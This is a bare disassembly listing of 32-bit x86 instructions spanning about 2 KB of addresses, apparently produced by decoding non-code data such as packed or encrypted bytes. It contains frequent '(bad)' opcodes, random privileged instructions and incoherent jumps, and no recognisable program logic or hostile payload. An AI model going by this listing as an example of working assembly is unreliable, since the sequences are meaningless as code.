  412cb1:	push   ecx
  412cb2:	jns    0x412cce
  412cb4:	jge    0x412cbe
  412cb6:	xlat   BYTE PTR ds:[ebx]
  412cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb8:	mov    eax,0x4af871c7
  412cbd:	adc    cl,ch
  412cbf:	dec    esi
  412cc0:	adc    DWORD PTR [esi+0x1bdebb63],edi
  412cc6:	mov    ch,0xff
  412cc8:	data16 aaa 
  412cca:	std    
  412ccb:	fsub   st,st(3)
  412ccd:	xchg   esp,eax
  412cce:	cs daa 
  412cd0:	inc    DWORD PTR [edx]
  412cd2:	mov    edi,DWORD PTR [eax+ebx*4-0x52]
  412cd6:	sar    DWORD PTR es:[ecx+edx*1],1
  412cda:	repnz adc BYTE PTR [ebp+0x2210503d],bl
  412ce1:	mov    cl,0xbb
  412ce3:	pop    ds
  412ce4:	sbb    edx,DWORD PTR [ecx-0x61]
  412ce7:	out    dx,eax
  412ce8:	sar    BYTE PTR [ebp+0x1],0x92
  412cec:	sub    BYTE PTR [edx],0x4f
  412cef:	imul   eax,esp,0x7b
  412cf2:	leave  
  412cf3:	mov    esi,0x7bda7cad
  412cf8:	js     0x412d60
  412cfa:	jp     0x412d16
  412cfc:	mov    eax,ds:0x84082344
  412d01:	xchg   esp,eax
  412d02:	mov    dl,cl
  412d04:	cmp    dh,dh
  412d06:	pusha  
  412d07:	fild   DWORD PTR [edx]
  412d09:	pushf  
  412d0a:	mov    dh,0x6b
  412d0c:	fstp   DWORD PTR [ebp-0x166a406a]
  412d12:	(bad)  
  412d13:	loop   0x412d26
  412d15:	(bad)  
  412d16:	mov    esi,0x485d2e7b
  412d1b:	dec    DWORD PTR [ebx]
  412d1d:	pop    es
  412d1e:	iret   
  412d1f:	cs jle 0x412d9b
  412d22:	daa    
  412d23:	(bad)  
  412d24:	pushf  
  412d25:	sub    DWORD PTR [edi-0x4d9aedad],0xffffff8c
  412d2c:	sub    BYTE PTR ds:0x11b02fb9,cl
  412d32:	inc    esp
  412d33:	test   eax,0x75a34c96
  412d38:	std    
  412d39:	lods   eax,DWORD PTR ds:[esi]
  412d3a:	xor    cl,ch
  412d3c:	push   edx
  412d3d:	mov    ebx,0x5349c9dd
  412d42:	add    DWORD PTR [ebx+0x185dbcd7],esp
  412d48:	fst    QWORD PTR [edx]
  412d4a:	mov    esp,0xd837aeb3
  412d4f:	jb     0x412ce0
  412d51:	inc    ebx
  412d52:	mov    fs,ebp
  412d54:	inc    esp
  412d55:	inc    BYTE PTR [si-0xf6c]
  412d5a:	rcl    edi,1
  412d5c:	xchg   edi,eax
  412d5d:	fidiv  DWORD PTR [ebx-0x7e478238]
  412d63:	(bad)  
  412d64:	js     0x412d5c
  412d66:	aaa    
  412d67:	push   0xd172bd35
  412d6c:	mov    al,al
  412d6e:	aam    0x8a
  412d70:	or     eax,0x12467448
  412d75:	xor    BYTE PTR [edx],0xf3
  412d78:	adc    bh,BYTE PTR [esi]
  412d7a:	icebp  
  412d7b:	out    dx,eax
  412d7c:	xor    eax,0xe5f9372d
  412d81:	push   edx
  412d82:	fidivr DWORD PTR [ebx]
  412d84:	adc    eax,0x3f7ef45d
  412d89:	call   0x24129ba7
  412d8e:	ds mov edx,0x6a4b4bb1
  412d94:	xchg   esi,eax
  412d95:	in     al,0xdb
  412d97:	leave  
  412d98:	jp     0x412d77
  412d9a:	inc    edx
  412d9b:	mov    dh,0x44
  412d9d:	rcr    ecx,cl
  412d9f:	mov    es,WORD PTR gs:[edx-0x1e]
  412da3:	icebp  
  412da4:	sub    ecx,esp
  412da6:	in     eax,0xac
  412da8:	xor    DWORD PTR [eax+ecx*1-0x5f],0x4ebd9f4a
  412db0:	push   ebx
  412db1:	add    BYTE PTR [ecx+0x685a0957],ch
  412db7:	cmp    eax,0x843f566d
  412dbc:	aam    0x8c
  412dbe:	adc    ebx,DWORD PTR [ecx-0x4]
  412dc1:	mov    ebx,0xd1acfc3f
  412dc6:	mov    ds:0xe53dadc5,eax
  412dcb:	dec    edx
  412dcc:	jb     0x412db6
  412dce:	nop
  412dcf:	test   al,0x5d
  412dd1:	pushf  
  412dd2:	add    eax,0x8008fef
  412dd7:	nop
  412dd8:	hlt    
  412dd9:	push   0xffffff9e
  412ddb:	dec    ecx
  412ddc:	sahf   
  412ddd:	inc    ebp
  412dde:	pop    esp
  412ddf:	mov    ebx,0x15e8169e
  412de4:	not    al
  412de6:	iret   
  412de7:	jnp    0x412dfa
  412de9:	mov    ds:0x181ab886,al
  412dee:	jge    0x412d9c
  412df0:	xor    bh,BYTE PTR [ebp+0x86d27]
  412df6:	mov    ecx,0x52352532
  412dfb:	sahf   
  412dfc:	cwde   
  412dfd:	sub    BYTE PTR [edx],bh
  412dff:	ins    BYTE PTR es:[edi],dx
  412e00:	add    DWORD PTR [ebp+0x5c],0x5f692b28
  412e07:	out    dx,eax
  412e08:	jmp    0x412db7
  412e0a:	mov    BYTE PTR [eax],bh
  412e0c:	push   ecx
  412e0d:	or     dl,BYTE PTR [ecx+0x4c]
  412e10:	(bad)  
  412e12:	dec    esi
  412e13:	retf   0xba86
  412e16:	pop    ds
  412e17:	or     BYTE PTR [eax+0x1e28ce40],0xdc
  412e1e:	iret   
  412e1f:	aaa    
  412e20:	leave  
  412e21:	cmp    al,0x26
  412e23:	rcl    BYTE PTR [ebp-0x7],0xde
  412e27:	pop    es
  412e28:	ins    BYTE PTR es:[edi],dx
  412e29:	lahf   
  412e2a:	and    BYTE PTR [eax+0x4],0x78
  412e2e:	in     al,0x57
  412e30:	mov    eax,ds:0xb9f2aeeb
  412e35:	inc    ebp
  412e36:	jg     0x412e83
  412e38:	jno    0x412e8d
  412e3a:	push   esi
  412e3b:	ss fs fs mov dh,0x25
  412e40:	pusha  
  412e41:	mov    ah,0xfb
  412e43:	lds    eax,FWORD PTR [esi+ecx*2-0x12]
  412e47:	gs pop esi
  412e49:	outs   dx,BYTE PTR cs:[esi]
  412e4b:	dec    ecx
  412e4c:	xor    ch,BYTE PTR ds:[ebx]
  412e4f:	out    0x48,eax
  412e51:	push   esp
  412e52:	xor    BYTE PTR [edi+0x46c2448a],ch
  412e58:	(bad)  
  412e59:	push   edi
  412e5a:	leave  
  412e5b:	push   0x2069404f
  412e60:	cmp    al,0xb0
  412e62:	push   edi
  412e63:	rol    ch,1
  412e65:	lods   al,BYTE PTR ds:[esi]
  412e66:	push   esi
  412e67:	repnz mul DWORD PTR ds:0x1cf57dd3
  412e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e6f:	adc    BYTE PTR [edx-0x73],cl
  412e72:	xor    eax,0x367d614a
  412e77:	sub    edx,DWORD PTR [ebx+0x36]
  412e7a:	adc    BYTE PTR [ebp-0xe],ch
  412e7d:	adc    BYTE PTR [edi-0x63],0xdd
  412e81:	ret    0x2e22
  412e84:	popa   
  412e85:	xchg   ax,ax
  412e88:	adc    eax,0x1da749b7
  412e8d:	or     ah,BYTE PTR [esi+0x4806a01a]
  412e93:	push   ebx
  412e94:	loopne 0x412e85
  412e96:	push   ds
  412e97:	jne    0x412e5f
  412e99:	jmp    0xebc39fd1
  412e9e:	invd   
  412ea0:	mov    dh,0x42
  412ea2:	mov    edi,0x2f89b69d
  412ea7:	loopne 0x412ec0
  412ea9:	add    ebp,esp
  412eab:	stos   DWORD PTR es:[edi],eax
  412eac:	in     eax,0xc7
  412eae:	mov    esi,0x4d3ecac4
  412eb3:	inc    ebp
  412eb4:	nop
  412eb5:	jnp    0x412f29
  412eb7:	inc    eax
  412eb8:	das    
  412eb9:	rcr    ebx,cl
  412ebb:	xchg   edx,eax
  412ebc:	(bad)
  412ebf:	in     eax,dx
  412ec0:	in     al,dx
  412ec1:	dec    eax
  412ec2:	jg     0x412e4e
  412ec4:	mov    ds:0xe3daec87,al
  412ec9:	mov    eax,0xec752d04
  412ece:	and    bl,BYTE PTR [ecx+0x1b]
  412ed1:	jmp    0xffcb:0x8f771908
  412ed8:	sbb    al,0x60
  412eda:	xchg   ebp,eax
  412edb:	or     BYTE PTR [eax-0x53],al
  412ede:	xchg   ebp,eax
  412edf:	mov    bh,0xd8
  412ee1:	nop
  412ee2:	aaa    
  412ee3:	xchg   edi,eax
  412ee4:	pop    ebx
  412ee5:	popf   
  412ee6:	push   esi
  412ee7:	mov    al,ds:0x21145ef6
  412eec:	add    eax,0x3928ba9e
  412ef1:	call   0xea698087
  412ef6:	mov    ecx,0x6f94717
  412efb:	(bad)
  412eff:	(bad)  
  412f00:	xor    eax,0xf30340e2
  412f05:	jb     0x412f23
  412f07:	cmp    bh,ah
  412f09:	loope  0x412ec7
  412f0b:	or     DWORD PTR [eax+0x66],ebp
  412f0e:	and    DWORD PTR [edi],0xffffff8c
  412f11:	xor    ecx,DWORD PTR [edx-0x6899a69d]
  412f17:	jl     0x412f3b
  412f19:	inc    ecx
  412f1a:	mov    bl,0x5e
  412f1c:	jo     0x412f4e
  412f1e:	ja     0x412ee7
  412f20:	rol    BYTE PTR [eax+esi*2],cl
  412f23:	push   0x6e
  412f25:	mov    bl,0xb1
  412f27:	int3   
  412f28:	imul   esi,eax,0x44
  412f2b:	mov    al,ds:0xba80f5a0
  412f30:	aaa    
  412f31:	hlt    
  412f32:	clc    
  412f33:	jno    0x412ed6
  412f35:	push   esp
  412f36:	retf   0xdcdd
  412f39:	sbb    cl,dh
  412f3b:	retf   0x3bc9
  412f3e:	jl     0x412f8d
  412f40:	push   eax
  412f41:	out    0xf7,al
  412f43:	rcr    dh,0xf
  412f46:	mov    dh,0x50
  412f48:	popf   
  412f49:	inc    ebp
  412f4a:	dec    esp
  412f4b:	xor    BYTE PTR [edi+0x2f33f0e7],0x4
  412f52:	pop    ds
  412f53:	stos   BYTE PTR es:[edi],al
  412f54:	repz cld 
  412f56:	mov    ebx,0x6f4607d
  412f5b:	cmp    ah,BYTE PTR [di]
  412f5e:	push   esp
  412f5f:	dec    ecx
  412f60:	fcom   DWORD PTR [edi]
  412f62:	ss loope 0x412f3b
  412f65:	outs   dx,DWORD PTR ds:[esi]
  412f66:	pop    edx
  412f67:	out    dx,eax
  412f68:	pop    esi
  412f69:	sub    eax,0x34dcfed4
  412f6e:	cmp    DWORD PTR [eax],edi
  412f70:	dec    eax
  412f71:	in     al,0x26
  412f73:	retf   
  412f74:	jns    0x412ff5
  412f76:	aam    0xfb
  412f78:	dec    edi
  412f79:	int    0x22
  412f7b:	bound  ebx,QWORD PTR [ecx]
  412f7d:	mov    esp,0xa14c844c
  412f82:	(bad)  
  412f83:	fcom   DWORD PTR [eax+0x77]
  412f86:	pop    ecx
  412f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f88:	add    DWORD PTR [edi],ebx
  412f8a:	sub    DWORD PTR [ecx+eiz*1+0xf],ebx
  412f8e:	ins    DWORD PTR es:[edi],dx
  412f8f:	push   0x41c3dab1
  412f94:	popa   
  412f95:	mov    esp,0x8754d2b7
  412f9a:	int3   
  412f9b:	push   es
  412f9c:	and    cl,BYTE PTR [esi-0x2f]
  412f9f:	mov    al,ds:0xbd66396d
  412fa4:	push   ds
  412fa5:	sub    dh,BYTE PTR [edi+ebx*8-0x3045bb07]
  412fac:	mov    al,0x7a
  412fae:	int3   
  412faf:	sub    cl,BYTE PTR ds:0x49d1100e
  412fb5:	pop    ecx
  412fb6:	ins    DWORD PTR es:[edi],dx
  412fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fb8:	dec    edi
  412fb9:	cli    
  412fba:	mov    bh,0xd0
  412fbc:	out    dx,eax
  412fbd:	pop    es
  412fbe:	sbb    al,0xee
  412fc0:	test   DWORD PTR [ecx+0xc723807],ecx
  412fc6:	ins    BYTE PTR es:[edi],dx
  412fc7:	adc    DWORD PTR [eax],0xffffff97
  412fca:	fidivr DWORD PTR [esi-0x2]
  412fcd:	pop    esp
  412fce:	jo     0x412ff8
  412fd0:	fwait
  412fd1:	push   esi
  412fd2:	adc    bl,BYTE PTR [eax+ecx*2+0x272638e6]
  412fd9:	dec    eax
  412fda:	inc    edx
  412fdb:	sub    DWORD PTR [ecx],ecx
  412fdd:	dec    edx
  412fde:	add    DWORD PTR [ecx+eax*8+0x6e],esi
  412fe2:	xor    al,0x43
  412fe4:	cmp    eax,0xa2b9e706
  412fe9:	sbb    eax,0x3f4fc898
  412fee:	push   ds
  412fef:	rol    BYTE PTR [ebx],1
  412ff1:	rcl    BYTE PTR [edi+eax*8+0xdf05b83],1
  412ff8:	mov    esp,0xec827851
  412ffd:	das    
  412ffe:	dec    ebx
  412fff:	int    0xf1
  413001:	sahf   
  413002:	dec    ebp
  413003:	out    0xb5,al
  413005:	mov    DWORD PTR [eax-0x2dd9559a],eax
  41300b:	push   0x74
  41300d:	(bad)  
  41300e:	cmovae ebp,DWORD PTR [edx+0x7cc1d837]
  413015:	mov    bl,BYTE PTR [ecx]
  413017:	jb     0x413007
  413019:	dec    ebp
  41301a:	or     dh,BYTE PTR [ebx-0x1562e060]
  413020:	jle    0x413067
  413022:	ror    BYTE PTR [edx+0x1756d1f2],1
  413028:	das    
  413029:	push   ecx
  41302a:	(bad)  
  41302b:	xchg   esi,eax
  41302c:	inc    ebp
  41302d:	xor    al,0x3b
  41302f:	sbb    al,bh
  413031:	mov    dh,0x6d
  413033:	cdq    
  413034:	push   eax
  413035:	pop    edi
  413036:	lock mov ecx,0xa2607e1c
  41303c:	in     al,dx
  41303d:	push   eax
  41303e:	loopne 0x413052
  413040:	inc    esi
  413041:	push   eax
  413042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413043:	aaa    
  413044:	xchg   edi,eax
  413045:	sbb    al,ah
  413047:	arpl   WORD PTR [ecx-0x28ce27ed],bx
  41304d:	mov    ecx,0x4e6cd4c
  413052:	loopne 0x413051
  413054:	xchg   ecx,eax
  413055:	and    edx,DWORD PTR [eax]
  413057:	cli    
  413058:	jmp    0x2069:0xb13df080
  41305f:	add    al,0x57
  413061:	add    DWORD PTR [ecx],ecx
  413063:	push   ss
  413064:	je     0x4130c0
  413066:	xor    edi,DWORD PTR [ebx]
  413068:	mov    ds:0x4f097c32,al
  41306d:	popf   
  41306e:	push   esp
  41306f:	das    
  413070:	in     al,dx
  413071:	(bad)  
  413072:	test   eax,0xf3509d2c
  413077:	cld    
  413078:	jnp    0x413099
  41307a:	push   esp
  41307b:	stc    
  41307c:	xchg   ecx,eax
  41307d:	stos   BYTE PTR es:[edi],al
  41307e:	xchg   edi,eax
  41307f:	daa    
  413080:	and    ah,bh
  413082:	pop    esi
  413083:	adc    BYTE PTR [ebx+0x1070f29f],0x10
  41308a:	or     eax,0xc1ada77e
  41308f:	lds    ebp,FWORD PTR [ebp-0xe]
  413092:	xor    eax,DWORD PTR [ebx-0x48]
  413095:	stos   BYTE PTR es:[edi],al
  413096:	bnd jl 0x41302c
  413099:	or     ebp,DWORD PTR ds:0xdf643fde
  41309f:	jg     0x413033
  4130a1:	inc    ecx
  4130a2:	pop    edi
  4130a3:	outs   dx,BYTE PTR ds:[esi]
  4130a4:	xchg   esi,eax
  4130a5:	or     eax,0x72cdb9fc
  4130aa:	adc    al,0x36
  4130ac:	and    DWORD PTR [eax-0x5f7f34b4],ecx
  4130b2:	mov    esi,0xae30bead
  4130b7:	jno    0x41311d
  4130b9:	bound  esp,QWORD PTR ds:[ecx]
  4130bc:	cld    
  4130bd:	rol    bh,0x7b
  4130c0:	sub    BYTE PTR [esi-0x48b69651],cl
  4130c6:	in     al,0xb6
  4130c8:	aaa    
  4130c9:	dec    eax
  4130ca:	inc    esi
  4130cb:	jp     0x413135
  4130cd:	into   
  4130ce:	jae    0x4130fb
  4130d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130d1:	pop    edx
  4130d2:	inc    esi
  4130d3:	out    0xd7,al
  4130d5:	scas   al,BYTE PTR es:[edi]
  4130d6:	dec    DWORD PTR [esi+0x6]
  4130d9:	xchg   DWORD PTR [ebp-0x531198fc],ecx
  4130df:	add    eax,0x51689712
  4130e4:	ds pop esp
  4130e6:	(bad)  
  4130e7:	sbb    eax,0x79531739
  4130ec:	pop    ecx
  4130ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ee:	pop    ebx
  4130ef:	test   eax,0xe14e624e
  4130f4:	add    ebp,DWORD PTR [esp+esi*8]
  4130f7:	sar    al,0x5c
  4130fa:	arpl   WORD PTR [edx-0x2e],ax
  4130fd:	mov    ah,0xce
  4130ff:	hlt    
  413100:	mov    ebx,0x89cce749
  413105:	cmp    al,dl
  413107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413108:	and    BYTE PTR [eax-0x787c2548],al
  41310e:	mov    bl,0xc2
  413110:	pop    ebp
  413111:	dec    esp
  413112:	aas    
  413113:	add    DWORD PTR [esi-0x41d77035],ecx
  413119:	adc    edx,ebp
  41311b:	scas   eax,DWORD PTR es:[edi]
  41311c:	mov    dl,0x27
  41311e:	loope  0x413180
  413120:	aaa    
  413121:	push   ebx
  413122:	fwait
  413123:	cdq    
  413124:	(bad)  
  413125:	cmc    
  413126:	push   es
  413127:	sar    DWORD PTR [esi+0x784df953],cl
  41312d:	fdiv   QWORD PTR [ebp-0x686f6c22]
  413133:	scas   al,BYTE PTR es:[edi]
  413134:	fiadd  WORD PTR [ebx]
  413136:	test   al,0x65
  413138:	je     0x4131a7
  41313a:	out    dx,al
  41313b:	adc    BYTE PTR [ecx],bh
  41313d:	or     DWORD PTR [esi+0x36],ebx
  413140:	push   esp
  413141:	jne    0x413107
  413143:	jns    0x413198
  413145:	popa   
  413146:	ret    0x3beb
  413149:	add    DWORD PTR [edi+edi*4],esi
  41314c:	inc    esp
  41314d:	mov    BYTE PTR [eax-0x7b65c6ac],al
  413153:	pop    edx
  413154:	adc    BYTE PTR [ecx-0x21],ch
  413157:	sbb    eax,0xdb1f7348
  41315c:	push   ebx
  41315d:	jbe    0x413195
  41315f:	jmp    0x41315b
  413161:	cmp    ebp,DWORD PTR [esi]
  413163:	dec    di
  413165:	mov    eax,0xe1f8b585
  41316a:	les    ebp,FWORD PTR [ecx]
  41316c:	stos   BYTE PTR es:[edi],al
  41316d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41316e:	dec    edi
  41316f:	adc    DWORD PTR ds:0x2f393c8a,esp
  413175:	imul   eax,DWORD PTR [esi-0x2fc60a5c],0xebaa277e
  41317f:	mov    edi,fs
  413181:	enter  0xea94,0x7f
  413185:	and    BYTE PTR [ecx],ah
  413187:	dec    ebp
  413188:	xor    edx,edx
  41318a:	stc    
  41318b:	pop    ss
  41318c:	mov    ds:0x5b6020f6,al
  413191:	(bad)  
  413192:	std    
  413193:	mov    al,ds:0x1114a75e
  413198:	loop   0x4131e9
  41319a:	in     al,dx
  41319b:	sar    DWORD PTR [edi],cl
  41319d:	xchg   esi,eax
  41319e:	sar    BYTE PTR [esi],0xdd
  4131a1:	lods   eax,DWORD PTR ds:[esi]
  4131a2:	out    0x4,eax
  4131a4:	scas   al,BYTE PTR es:[edi]
  4131a5:	cmp    eax,0xffbd871e
  4131aa:	add    BYTE PTR [edi],bl
  4131ac:	and    BYTE PTR [eax],0x2b
  4131af:	add    eax,0x7d386aa5
  4131b4:	sbb    DWORD PTR [eax+0x321da4a2],edx
  4131ba:	and    edx,0xffffffbd
  4131bd:	mov    ds:0x9f61ee48,eax
  4131c2:	mov    al,0xb2
  4131c4:	int3   
  4131c5:	mov    esp,0x1381b755
  4131ca:	xchg   BYTE PTR [esi+0x5b],dh
  4131cd:	dec    edx
  4131ce:	ss push esi
  4131d0:	in     al,dx
  4131d1:	aad    0x8f
  4131d3:	enter  0xd3dd,0x64
  4131d7:	daa    
  4131d8:	adc    ebx,edx
  4131da:	xchg   edx,eax
  4131db:	jg     0x4131ff
  4131dd:	jl     0x413160
  4131df:	cs dec edx
  4131e1:	fild   DWORD PTR [edi+0xc163501]
  4131e7:	inc    eax
  4131e8:	mov    dl,0x36
  4131ea:	js     0x413267
  4131ec:	push   ss
  4131ed:	dec    esp
  4131ee:	in     al,dx
  4131ef:	call   0x15d02fcd
  4131f4:	pop    eax
  4131f5:	in     al,dx
  4131f6:	das    
  4131f7:	(bad)  
  4131f8:	lock je 0x413216
  4131fb:	call   0x6605:0x8a3c8a8b
  413202:	pop    ss
  413203:	xchg   ebp,eax
  413204:	sbb    DWORD PTR ds:0x2a9c7965,0xfb8f6ff1
  41320e:	adc    eax,0x9fb65c3c
  413213:	push   esi
  413214:	add    al,0x43
  413216:	or     DWORD PTR ds:0xc171498a,eax
  41321c:	fiadd  DWORD PTR [ecx+eiz*8-0x701bad74]
  413223:	call   0x7862e2f4
  413228:	jp     0x4131aa
  41322a:	sti    
  41322b:	or     DWORD PTR ds:0xa95827fd,ecx
  413231:	mov    esi,0x27701a00
  413236:	and    eax,ebp
  413238:	and    bh,al
  41323a:	sahf   
  41323b:	mov    ch,0x5e
  41323d:	out    dx,al
  41323e:	sti    
  41323f:	pop    eax
  413240:	xchg   ebp,eax
  413241:	adc    DWORD PTR [esi],ebx
  413243:	xor    ebx,ebp
  413245:	push   ebp
  413246:	aas    
  413247:	inc    ebp
  413248:	inc    ebx
  413249:	jb     0x413232
  41324b:	sbb    ebx,ecx
  41324d:	cmp    al,0x96
  41324f:	push   ss
  413250:	push   esi
  413251:	addr16 dec edi
  413253:	or     bh,BYTE PTR ds:0x979fa338
  413259:	jns    0x413219
  41325b:	out    dx,al
  41325c:	pop    esp
  41325d:	dec    ebx
  41325e:	mov    eax,edi
  413260:	js     0x4131fa
  413262:	sbb    ah,BYTE PTR [eax]
  413264:	scas   al,BYTE PTR es:[edi]
  413265:	es adc al,0x4a
  413268:	xor    BYTE PTR [edi],dh
  41326a:	(bad)  
  41326c:	inc    esi
  41326d:	mov    ch,0xb8
  41326f:	test   DWORD PTR [ecx+edx*2+0x1e],esp
  413273:	add    cl,BYTE PTR [ebp-0x3d]
  413276:	call   0x6f742cd9
  41327b:	mov    dl,ch
  41327d:	or     cl,ch
  41327f:	pop    esp
  413280:	mov    al,ds:0x45d4eaa1
  413285:	jnp    0x413216
  413287:	retf   0x619d
  41328a:	sub    DWORD PTR [ebx-0x33],ebp
  41328d:	fisub  WORD PTR [eax+0x7d2f3879]
  413293:	fiadd  WORD PTR [edi+0x42]
  413296:	outs   dx,BYTE PTR ds:[esi]
  413297:	in     eax,0xe1
  413299:	mov    BYTE PTR [ebx+0x29],0x3
  41329d:	in     eax,dx
  41329e:	fisttp DWORD PTR ds:0x76e5439a
  4132a4:	adc    BYTE PTR [esp+edi*8],0x90
  4132a8:	fst    QWORD PTR [edi-0x2968dd1a]
  4132ae:	pop    esp
  4132af:	mov    ebx,0xb71f3fb4
  4132b4:	jmp    0xabf2:0xcb9b9a4a
  4132bb:	push   esp
  4132bc:	jecxz  0x413290
  4132be:	pop    edi
  4132bf:	mov    eax,ds:0xe5fdfc04
  4132c4:	and    BYTE PTR [ebx+0xadceea2],dh
  4132ca:	outs   dx,BYTE PTR ds:[esi]
  4132cb:	and    BYTE PTR [ebx+0xf72f546],dl
  4132d1:	or     ch,BYTE PTR [ebp-0x50]
  4132d4:	std    
  4132d5:	mov    bh,0x98
  4132d7:	popf   
  4132d8:	arpl   WORD PTR [eax-0x4a],cx
  4132db:	out    0x2a,al
  4132dd:	(bad)  
  4132df:	cld    
  4132e0:	ror    ecx,cl
  4132e2:	sbb    esp,esi
  4132e4:	mov    edx,0x9429455d
  4132e9:	lahf   
  4132ea:	dec    ebp
  4132eb:	repz push DWORD PTR [ebx-0x20e9878d]
  4132f2:	dec    ebp
  4132f3:	lods   eax,DWORD PTR ds:[esi]
  4132f4:	fucomi st,st(3)
  4132f6:	ret    
  4132f7:	add    ch,BYTE PTR [edi-0x13]
  4132fa:	cs gs jl 0x4132e0
  4132fe:	dec    ebp
  4132ff:	cmp    BYTE PTR [ecx],cl
  413301:	or     esp,DWORD PTR [eax+0x12fdaf4b]
  413307:	xchg   edx,eax
  413308:	pop    ebx
  413309:	mov    eax,0x14f8a569
  41330e:	test   eax,0xbb9a7e9a
  413313:	xchg   BYTE PTR [eax-0x20],ch
  413316:	jge    0x413386
  413318:	nop
  413319:	inc    edi
  41331a:	shl    DWORD PTR [esi],0xdb
  41331d:	(bad)  
  41331f:	pop    eax
  413320:	stos   BYTE PTR es:[edi],al
  413321:	ror    DWORD PTR [edi],1
  413323:	xor    ah,bh
  413325:	xchg   BYTE PTR [ecx],bl
  413327:	in     eax,dx
  413328:	mov    esi,?
  41332a:	ret    0x325a
  41332d:	nop
  41332e:	dec    ecx
  41332f:	ror    DWORD PTR [esi],1
  413331:	aam    0xec
  413333:	mov    eax,0x12b18064
  413338:	enter  0xeed,0xa9
  41333c:	jge    0x4132c1
  41333e:	push   0xec2fa785
  413343:	aam    0x7
  413345:	pop    esp
  413346:	pop    ds
  413347:	adc    al,0xe8
  413349:	sar    esi,0x8
  41334c:	xchg   ebx,eax
  41334d:	jge    0x4133b4
  41334f:	test   eax,0xbd9ecfda
  413354:	push   ebx
  413355:	lock push 0x25a7ded
  41335b:	pop    edi
  41335c:	cmp    ch,BYTE PTR [ebx-0x71]
  41335f:	jnp    0x41331c
  413361:	std    
  413362:	imul   eax,DWORD PTR [edx+0x72063942],0xffffffe3
  413369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336a:	sub    ebp,ebp
  41336c:	call   0x26f6:0xebbac278
  413373:	aam    0xff
  413375:	es popa 
  413377:	(bad)  [ecx+0x6fc4e6d]
  41337d:	lods   eax,DWORD PTR ds:[esi]
  41337e:	mov    dl,0xc0
  413380:	cmp    al,0x57
  413382:	test   al,0x49
  413384:	jne    0x413365
  413386:	(bad)  
  413387:	mov    dh,0x3
  413389:	out    0x9d,eax
  41338b:	scas   eax,DWORD PTR es:[edi]
  41338c:	fstp   st(0)
  41338e:	nop
  41338f:	stc    
  413390:	mov    bh,0xba
  413392:	cmp    DWORD PTR [ebp-0x46],ebx
  413395:	sahf   
  413396:	mov    WORD PTR [edx+0x56f6b2bb],?
  41339c:	movhps xmm3,QWORD PTR [edx+eiz*1]
  4133a0:	sbb    bh,0x5
  4133a3:	push   ecx
  4133a4:	les    esi,FWORD PTR [ebx]
  4133a6:	mov    eax,ds:0x2631f359
  4133ab:	rcr    dh,cl
  4133ad:	ffree  st(1)
  4133af:	test   eax,0x85a057d
  4133b4:	jne    0x413380
  4133b6:	pop    edi
  4133b7:	mov    dl,0x70
  4133b9:	popf   
  4133ba:	retf   
  4133bb:	mov    ecx,0x2307ce5c
  4133c0:	mov    esi,0x52901b7a
  4133c5:	outs   dx,DWORD PTR ds:[esi]
  4133c6:	pop    ebx
  4133c7:	mov    ebx,0x93e014e6
  4133cc:	je     0x413358
  4133ce:	xor    eax,0x996c51ef
  4133d3:	inc    ebp
  4133d4:	xchg   edx,eax
  4133d5:	out    0x49,al
  4133d7:	out    0x28,al
  4133d9:	adc    eax,0x915b2c40
  4133de:	jp     0x413457
  4133e0:	out    dx,eax
  4133e1:	adc    dh,al
  4133e3:	test   edx,ecx
  4133e5:	frstor [esi+0x3e]
  4133e8:	arpl   WORD PTR [esi+ebx*2-0xe],si
  4133ec:	fs pop ds
  4133ee:	fst    DWORD PTR [esi]
  4133f0:	sahf   
  4133f1:	es mov bh,0x94
  4133f4:	inc    esp
  4133f5:	adc    edi,DWORD PTR [esi+0x33494cc0]
  4133fb:	adc    al,0xf0
  4133fd:	mov    ds:0xb6f53753,al
  413402:	scas   al,BYTE PTR es:[edi]
  413403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413404:	shr    DWORD PTR [esi+ecx*1+0x13],1
  413408:	ror    cl,1
  41340a:	in     al,0xdc
  41340c:	mov    esi,0xd45f2e0c
  413411:	mov    eax,ss
  413413:	(bad)  
  413414:	fstp   DWORD PTR cs:[ebx]
  413417:	sub    cl,dl
  413419:	cmp    ebx,DWORD PTR [ebx]
  41341b:	(bad)  
  41341d:	mov    bh,0x29
  41341f:	xchg   ebx,eax
  413420:	xor    eax,0x9cd33e16
  413425:	imul   eax,ebx,0x49
  413428:	push   0x1009e9d1
  41342d:	leave  
  41342e:	mov    dh,0x75
  413430:	mov    esp,DWORD PTR [ebp-0x70]
  413433:	dec    ebp
  413434:	and    DWORD PTR [edi-0x12],edi
  413437:	mov    ch,0xa4
  413439:	xor    BYTE PTR [edi-0x71],0xef
  41343d:	lods   eax,DWORD PTR ds:[esi]
  41343e:	mov    cl,0x48
  413440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413441:	mov    ds:0x9ba0d1a9,al
  413446:	rcr    BYTE PTR [ebx-0x39a1f137],0xc9
  41344d:	pop    ecx
  41344e:	jb     0x4133e3
  413450:	ret    
  413451:	push   es
  413452:	frstor [edx+0x32]
  413455:	push   ebp
  413456:	xor    DWORD PTR [eax],0x5a0400cb
  41345c:	aam    0x82
  41345e:	inc    esi
  41345f:	retf   
  413460:	lock pop esi
  413462:	and    al,0xc
  413464:	push   0x9785d269
  413469:	cmp    esp,DWORD PTR [edx]
  41346b:	ja     0x413489
  41346d:	scas   eax,DWORD PTR es:[edi]
  41346e:	mov    ?,WORD PTR [esi]
  413470:	imul   ebx,DWORD PTR [edx+0x235f139b],0x50
  413477:	push   DWORD PTR [edx]
  413479:	mov    edx,0x9a484282
  41347e:	mov    WORD PTR [edi],?
  413480:	cwde   
  413481:	pop    ss
  413482:	fist   DWORD PTR [eax]
  413484:	mov    bl,0x23
  413486:	cmp    eax,0xf863cb1b
  41348b:	xor    al,0x4d
  41348d:	das    
  41348e:	ret    0xce81
  413491:	adc    BYTE PTR [edx],0x69
